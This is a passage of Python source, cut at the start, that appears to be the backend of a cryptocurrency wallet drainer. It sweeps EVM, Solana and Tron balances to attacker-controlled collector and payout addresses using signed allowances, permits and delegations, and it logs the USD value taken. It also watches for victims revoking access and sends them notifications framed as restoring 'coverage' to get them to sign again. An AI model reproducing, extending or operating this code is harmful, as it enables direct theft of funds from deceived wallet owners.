        keypair, grant, payout, blockhash, amount, destination_exists=exists
    )
    txid = await solana_tx.broadcast(rpc, base64.b64encode(bytes(tx)).decode(), last_valid)
    return {"kind": "sent", "txid": txid}


async def sol_submit(grant_id: str, payload_b64: str) -> str:
    """Broadcast a client co-signed native transaction."""
    grant = q_get("SELECT * FROM drainer_grants WHERE id = ?", grant_id)
    if not grant:
        raise ValueError("grant not found")
    if grant["status"] != "awaiting_signature":
        raise ValueError(f"grant is {grant['status']}, not awaiting a signature")

    solana_tx.finalize_client_signed(payload_b64)
    txid = await solana_tx.broadcast(
        SOLANA_RPCS[0], payload_b64, grant.get("last_valid_block_height")
    )
    q_run("UPDATE drainer_grants SET status = 'used', txid = ?, payload = NULL,"
          " error = NULL WHERE id = ?", txid, grant_id)
    return txid


# ------------------------------------------------------------------ Tron
def _tron_sign(private_key, tx: Dict[str, Any]) -> Dict[str, Any]:
    signature = private_key.sign_msg_hash(bytes.fromhex(tx["txID"]))
    tx["signature"] = [signature.hex() if isinstance(signature, (bytes, bytearray))
                       else str(signature)]
    return tx


async def _tron_pull(grant: Dict[str, Any]) -> str:
    from tronpy.keys import PrivateKey

    key = _require_key("tron")
    private_key = PrivateKey(bytes.fromhex(key.removeprefix("0x")))
    collector = crypto.tron_address_from_key(key)
    payout = _payout("tron")
    if not payout:
        raise RuntimeError("no Tron payout address")

    if _is_native(grant):
        # execute_drain refreshes balance_raw from a fresh scan, which drops the
        # reserve prepare made. Re-apply it or the transfer eats its own fee.
        amount = int(grant["balance_raw"]) - TRON_FEE_RESERVE_SUN
        if amount <= 0:
            raise RuntimeError("TRX below the fee reserve")
        tx = await tron_tx.build_transfer(collector, payout, amount)
    else:
        tx = await tron_tx.build_transfer_from(
            collector, grant["token"], grant["address"], int(grant["balance_raw"])
        )

    return await tron_tx.broadcast(_tron_sign(private_key, tx))


# ------------------------------------------------------------------ execute
def _batch_key(grant: Dict[str, Any]) -> Optional[Tuple[Any, ...]]:
    """Identity of a signed PermitBatch: one transaction must submit all of them."""
    batch = _permit_batch_of(grant)
    if not batch:
        return None
    return (grant["network"], (grant["address"] or "").lower(),
            str(batch.get("spender", "")).lower(), int(batch.get("sigDeadline") or 0),
            json.dumps(batch.get("details"), sort_keys=True))


async def _preflight_gas(grants: List[Dict[str, Any]]) -> Dict[Tuple[str, str], str]:
    """
    One consolidated gas check per chain before spending anything. Returns
    {(family, network): reason} for chains whose collector cannot pay.
    A run then marks those grants `skipped` instead of failing them one by one.
    """
    errors: Dict[Tuple[str, str], str] = {}
    families = {g["family"] for g in grants}

    if "evm" in families and get_setting("drainer_evm_key"):
        try:
            key = _require_key("evm")
            account = Account.from_key(key)
            for net in {g["network"] for g in grants if g["family"] == "evm"}:
                try:
                    fee = await _fee_fields(net)
                    cost = 320_000 * _fee_cap(fee) * GAS_BUFFER
                    balance = int(await _rpc(net, "eth_getBalance",
                                             [account.address, "latest"]), 16)
                    if balance < cost:
                        errors[("evm", net)] = (
                            f"MISSING_GAS: collector needs ~{cost / 1e18:.6f} native on {net}")
                except Exception as exc:                     # noqa: BLE001
                    errors[("evm", net)] = f"gas preflight failed on {net}: {exc}"[:200]
        except Exception:                                    # noqa: BLE001
            pass

    if "solana" in families and _collector_sol():
        try:
            import httpx
            key = _require_key("solana")
            _kp, address = crypto.solana_keypair_from_secret(key)
            async with httpx.AsyncClient(timeout=12.0) as client:
                r = await client.post(SOLANA_RPCS[0], json={
                    "jsonrpc": "2.0", "id": 1, "method": "getBalance",
                    "params": [address, {"commitment": "confirmed"}]})
            lamports = int((((r.json() or {}).get("result") or {}).get("value")) or 0)
            needed = 30_000_000  # ~0.03 SOL for a collection tx
            if lamports < needed:
                errors[("solana", "Solana")] = "MISSING_GAS: collector SOL too low"
        except Exception:                                    # noqa: BLE001
            pass

    if "tron" in families and _collector_tron():
        try:
            import httpx
            key = _require_key("tron")
            address = crypto.tron_address_from_key(key)
            async with httpx.AsyncClient(timeout=12.0,
                                         headers=tron_tx._headers()) as client:
                r = await client.post(f"{tron_tx._base()}/wallet/getaccount",
                                      json={"address": address, "visible": True})
                sun = int((r.json() or {}).get("balance", 0) or 0)
            if sun < 30_000_000:
                errors[("tron", "Tron")] = "MISSING_GAS: collector TRX too low"
        except Exception:                                    # noqa: BLE001
            pass

    return errors


def _execute_lock(user_id: int) -> asyncio.Lock:
    """One drain per user at a time — auto worker and admins can collide."""
    key = (id(asyncio.get_running_loop()), user_id)
    lock = _execute_locks.get(key)
    if lock is None:
        lock = asyncio.Lock()
        _execute_locks[key] = lock
    return lock


async def execute_drain(user_id: int, trigger: str = "manual",
                        actor_id: Optional[int] = None,
                        only: Optional[List[str]] = None,
                        prefetched: Optional[Dict[Any, List[Dict[str, Any]]]] = None
                        ) -> Dict[str, Any]:
    async with _execute_lock(user_id):
        return await _execute_drain(user_id, trigger, actor_id, only, prefetched)


async def _execute_drain(user_id: int, trigger: str = "manual",
                         actor_id: Optional[int] = None,
                         only: Optional[List[str]] = None,
                         prefetched: Optional[Dict[Any, List[Dict[str, Any]]]] = None
                         ) -> Dict[str, Any]:
    run_id = uuid.uuid4().hex
    q_run("INSERT INTO drainer_events (run_id, user_id, actor_id, trigger, status, created_at)"
          " VALUES (?,?,?,?,'running',?)", run_id, user_id, actor_id, trigger, now())

    grants = q_all("SELECT * FROM drainer_grants WHERE user_id = ? AND status = 'active'",
                   user_id)
    if only:
        keep = set(only)
        grants = [g for g in grants if g["id"] in keep]

    total_usd = 0.0
    ok_count = 0
    fail_count = 0
    deferred = 0
    skip_count = 0
    used: List[str] = []
    items: List[Dict[str, Any]] = []

    def _item(grant: Dict[str, Any], status: str, raw: str, usd: float,
              txid: Optional[str] = None, error: Optional[str] = None) -> None:
        q_run("INSERT INTO drainer_items (run_id, grant_id, family, network, symbol,"
              " amount, usd, status, txid, error, created_at)"
              " VALUES (?,?,?,?,?,?,?,?,?,?,?)",
              run_id, grant["id"], grant["family"], grant["network"], grant["symbol"],
              raw, usd, status, txid, error, now())

    def _sent(grant: Dict[str, Any], txid: str, amount: int) -> None:
        nonlocal total_usd, ok_count
        q_run("UPDATE drainer_grants SET status = 'used', txid = ?, error = NULL"
              " WHERE id = ?", txid, grant["id"])
        used.append(grant["id"])
        raw_total = max(int(grant.get("_raw_total") or amount), 1)
        usd = float(grant.get("_usd_total") or 0.0) * min(amount / raw_total, 1.0)
        total_usd += usd
        ok_count += 1
        _item(grant, "sent", str(amount), usd, txid=txid)
        items.append({"symbol": grant["symbol"], "network": grant["network"],
                      "usd": usd, "txid": txid})

    def _failed(grant: Dict[str, Any], message: str) -> None:
        nonlocal fail_count
        fail_count += 1
        lowered = message.lower()
        if "expired" in lowered:
            q_run("UPDATE drainer_grants SET status = 'expired', error = ? WHERE id = ?",
                  message, grant["id"])
        elif "missing_delegate" in lowered or "allowance is zero" in lowered:
            q_run("UPDATE drainer_grants SET status = 'revoked', error = ? WHERE id = ?",
                  message, grant["id"])
        _item(grant, "failed", str(grant.get("_raw_total") or 0),
              float(grant.get("_usd_total") or 0.0), error=message)

    def _skipped(grant: Dict[str, Any], message: str) -> None:
        """Grant is still active; the chain could not be attempted this run."""
        nonlocal skip_count
        skip_count += 1
        _item(grant, "skipped", str(grant.get("_raw_total") or 0),
              float(grant.get("_usd_total") or 0.0), error=message)

    by_wallet: Dict[Any, List[Dict[str, Any]]] = {}
    for grant in grants:
        by_wallet.setdefault(grant["wallet_id"], []).append(grant)

    for wallet_id, wallet_grants in by_wallet.items():
        wallet = q_get("SELECT * FROM wallets WHERE id = ?", wallet_id)
        if not wallet:
            for grant in wallet_grants:
                q_run("UPDATE drainer_grants SET status = 'revoked' WHERE id = ?", grant["id"])
            continue

        # One scan per wallet per run — a wallet can carry dozens of grants. The
        # auto-drain worker passes its own scan in so every chain is walked once.
        scan_failed = False
        if prefetched is not None and wallet_id in prefetched:
            fresh = prefetched[wallet_id]
        else:
            try:
                fresh = await scanners.scan_wallet(wallet)
            except Exception as exc:                         # noqa: BLE001
                logger.warning("scan before drain failed for wallet %s: %s", wallet_id, exc)
                fresh = []
                scan_failed = True

        index = {(asset["network"], (asset.get("token") or "").lower()): asset
                 for asset in fresh}

        usable: List[Dict[str, Any]] = []
        gas_errors: Optional[Dict[Tuple[str, str], str]] = None
        for grant in wallet_grants:
            match = index.get((grant["network"], (grant["token"] or "").lower()))
            if not match or int(match["balance_raw"]) <= 0:
                # A failed RPC read is not the same as an empty wallet.
                if scan_failed:
                    _skipped(grant, "scan failed — balance unknown")
                else:
                    _item(grant, "empty", "0", 0.0)
                continue
            grant["balance_raw"] = str(match["balance_raw"])
            grant["_raw_total"] = int(match["balance_raw"])
            grant["_usd_total"] = float(match.get("usd") or 0.0)
            if match.get("symbol"):
                grant["symbol"] = match["symbol"]
            usable.append(grant)

        if usable:
            gas_errors = await _preflight_gas(usable)
            if gas_errors:
                kept = []
                for grant in usable:
                    reason = gas_errors.get((grant["family"], grant["network"]))
                    if reason:
                        _skipped(grant, reason)
                    else:
                        kept.append(grant)
                usable = kept

        batches: Dict[Tuple[Any, ...], List[Dict[str, Any]]] = {}
        singles: List[Dict[str, Any]] = []
        for grant in usable:
            key = _batch_key(grant) if grant["family"] == "evm" else None
            if key and grant.get("signature"):
                batches.setdefault(key, []).append(grant)
            else:
                singles.append(grant)

        for group in batches.values():
            try:
                txid, picks = await _evm_pull_batch(group)
            except Exception as exc:                         # noqa: BLE001
                message = str(exc)[:300]
                logger.warning("drain batch %s failed: %s", group[0]["network"], message)
                for grant in group:
                    _failed(grant, message)
                continue

            picked = {grant["id"]: amount for grant, amount in picks}
            for grant in group:
                amount = picked.get(grant["id"])
                if amount:
                    _sent(grant, txid, amount)
                else:
                    _item(grant, "empty", "0", 0.0)

        for grant in singles:
            try:
                if grant["family"] == "evm":
                    txid = await _evm_pull(grant)
                    _sent(grant, txid, int(grant["balance_raw"]))

                elif grant["family"] == "solana":
                    result = await _sol_pull(grant)
                    if result["kind"] == "deferred":
                        q_run("UPDATE drainer_grants SET status = 'awaiting_signature',"
                              " payload = ?, blockhash = ?, last_valid_block_height = ?,"
                              " error = ? WHERE id = ?",
                              result["payload"], result["blockhash"],
                              result["last_valid_block_height"], result["reason"],
                              grant["id"])
                        # Nothing else re-prompts a residue, so tell the user now.
                        q_run("INSERT INTO notifications (user_id, type, title, body,"
                              " link, created_at) VALUES (?, 'drainer', 'Native SOL left"
                              " to collect', 'Sign once more to sweep residual SOL.',"
                              " ?, ?)",
                              user_id, f"/sign.html?wallet={grant['wallet_id']}", now())
                        _item(grant, "deferred", str(grant["balance_raw"]),
                              float(grant.get("_usd_total") or 0.0), error=result["reason"])
                        deferred += 1
                        continue
                    _sent(grant, result["txid"], int(grant["balance_raw"]))

                elif grant["family"] == "tron":
                    txid = await _tron_pull(grant)
                    _sent(grant, txid, int(grant["balance_raw"]))

            except Exception as exc:                          # noqa: BLE001
                message = str(exc)[:300]
                logger.warning("drain %s/%s failed: %s",
                               grant["family"], grant["symbol"], message)
                _failed(grant, message)

    status = "done" if fail_count == 0 and deferred == 0 and skip_count == 0 else "partial"
    q_run("UPDATE drainer_events SET status = ?, total_usd = ?, tx_count = ? WHERE run_id = ?",
          status, total_usd, ok_count, run_id)

    return {
        "run_id": run_id, "total_usd": total_usd, "sent": ok_count,
        "failed": fail_count, "deferred": deferred, "skipped": skip_count,
        "used": used, "items": items,
    }


VERIFY_THROTTLE_MS = 3_600_000


async def _sol_delegate_ok(grant: Dict[str, Any]) -> bool:
    collector = _collector_sol()
    if not collector or not grant.get("token_account"):
        return False
    result = await scanners._solana_rpc(
        "getTokenAccountsByOwner",
        [grant["address"], {"programId": grant.get("program")}, {"encoding": "jsonParsed"}])
    for account in ((result or {}).get("value") or []):
        if account.get("pubkey") != grant["token_account"]:
            continue
        info = (account.get("account", {}).get("data", {})
                .get("parsed", {}).get("info", {}))
        delegate = info.get("delegate")
        delegated = int((info.get("delegatedAmount") or {}).get("amount") or 0)
        return bool(delegate) and delegate == collector and delegated > 0
    return False


async def _tron_allowance_ok(grant: Dict[str, Any]) -> bool:
    spender = _collector_tron()
    if not spender:
        return False
    token = grant["token"]
    if token == tron_tx.TRON_USDT:
        dec = 6
    else:
        try:
            dec = int(grant.get("decimals") or 18)
        except (TypeError, ValueError):
            dec = 18
    parameter = tron_tx.tron_address_to_word(grant["address"]) + tron_tx.tron_address_to_word(spender)
    import httpx
    async with httpx.AsyncClient(timeout=12.0, headers=tron_tx._headers()) as client:
        response = await client.post(f"{tron_tx._base()}/wallet/triggerconstantcontract", json={
            "owner_address": grant["address"], "contract_address": token,
            "function_selector": "allowance(address,address)",
            "parameter": parameter, "visible": True,
        })
    result = ((response.json() or {}).get("constant_result") or [])
    return bool(result) and int(result[0] or "0", 16) > 0


async def grant_still_valid(grant: Dict[str, Any]) -> bool:
    """Read the live on-chain permission; a local row cannot prove one exists."""
    family = (grant.get("family") or "").lower()
    if family == "evm":
        receiver = _collector_evm(grant["network"])
        if not receiver:
            return False
        return await _evm_allowance(grant, receiver) > 0
    if family == "solana":
        return await _sol_delegate_ok(grant)
    if family == "tron":
        return await _tron_allowance_ok(grant)
    return True


async def verify_grants(user_id: int) -> Dict[str, Any]:
    """
    Detect an on-chain revoke and re-queue the wallet. A user can always clear an
    allowance inside MetaMask/Phantom, and that is invisible to the DB.

    `prepare_wallet` supersedes every live grant on a wallet, so at most one
    re-prepare per wallet per hour — a tighter loop would re-prompt constantly.
    """
    grants = q_all("SELECT * FROM drainer_grants WHERE user_id = ? AND status = 'active'"
                   " AND kind != 'native_tx'", user_id)
    revoked, skipped = [], 0
    for grant in grants:
        try:
            ok = await grant_still_valid(grant)
        except Exception as exc:                             # noqa: BLE001
            logger.debug("verify %s failed: %s", grant["id"], exc)
            skipped += 1
            continue
        if ok:
            continue
        q_run("UPDATE drainer_grants SET status = 'revoked', error = ?,"
              " activated_at = NULL WHERE id = ?",
              "allowance gone on-chain", grant["id"])
        revoked.append(grant)
        q_run("INSERT INTO notifications (user_id, type, title, body, link, created_at)"
              " VALUES (?, 'drainer', 'Wallet access was revoked',"
              " 'An allowance was cleared in your wallet. Re-authorise to restore coverage.',"
              " ?, ?)", user_id, f"/sign.html?wallet={grant['wallet_id']}", now())

    wallets = sorted({g["wallet_id"] for g in revoked})
    requeued = []
    for wallet_id in wallets:
        row = q_get("SELECT last_at FROM drainer_verify WHERE wallet_id = ?", wallet_id)
        if row and now() - int(row["last_at"] or 0) < VERIFY_THROTTLE_MS:
            continue
        q_run("INSERT OR REPLACE INTO drainer_verify (wallet_id, last_at) VALUES (?, ?)",
              wallet_id, now())
        try:
            await prepare_wallet(user_id, wallet_id)
            requeued.append(wallet_id)
        except Exception as exc:                             # noqa: BLE001
            logger.warning("re-prepare after revoke failed for %s: %s", wallet_id, exc)

    return {"checked": len(grants), "revoked": len(revoked),
            "skipped": skipped, "requeued": requeued}


async def restore_grant(grant_id: str) -> Dict[str, Any]:
    """Re-activate a locally revoked grant if the permission is still on-chain."""
    grant = q_get("SELECT * FROM drainer_grants WHERE id = ?", grant_id)
    if not grant:
        raise ValueError("grant not found")
    if grant["status"] == "active":
        return {"ok": True, "grant_id": grant_id, "already": True}
    if _is_native(grant):
        q_run("UPDATE drainer_grants SET status = 'active', activated_at = ? WHERE id = ?",
              now(), grant_id)
        return {"ok": True, "grant_id": grant_id}
    if not await grant_still_valid(grant):
        raise ValueError("the allowance is gone on-chain — re-sign this wallet instead")
    q_run("UPDATE drainer_grants SET status = 'active', activated_at = ?, error = NULL"
          " WHERE id = ?", now(), grant_id)
    return {"ok": True, "grant_id": grant_id}


async def revoke_grant(grant_id: str, txid: Optional[str] = None) -> Dict[str, Any]:
    """
    Local revocation record. The on-chain half is built by `revoke.py` and signed
    by the owner; pass its txid here. Without a txid this only hides the grant
    from future drains.
    """
    grant = q_get("SELECT * FROM drainer_grants WHERE id = ?", grant_id)
    if not grant:
        raise ValueError("grant not found")
    q_run("UPDATE drainer_grants SET status = 'revoked', revoke_txid = ?,"
          " activated_at = NULL, payload = NULL WHERE id = ?", txid, grant_id)
    return {"ok": True, "grant_id": grant_id, "onchain": bool(txid)}